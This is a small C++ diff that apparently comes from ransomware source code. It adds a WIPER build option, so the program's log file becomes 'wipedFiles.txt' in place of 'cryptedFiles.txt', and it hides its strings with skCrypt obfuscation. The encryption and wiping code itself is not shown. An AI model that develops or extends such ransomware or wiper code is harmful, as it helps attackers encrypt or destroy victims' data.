@@ -101,7 +101,12 @@ int main(int argc, char* argv[]) {
 
 
     // cryptedFiles.txt
-    string cryptFileName = filePath + (string)skCrypt("\\cryptedFiles.txt");
+    string cryptFileName = filePath;
+#if WIPER
+    cryptFileName += (string)skCrypt("\\wipedFiles.txt");
+#else
+    cryptFileName += (string)skCrypt("\\cryptedFiles.txt");
+#endif
     ofstream cryptFile(cryptFileName, ios::out | ios::binary);
     cryptFile << smarker;
     cryptFile.close();
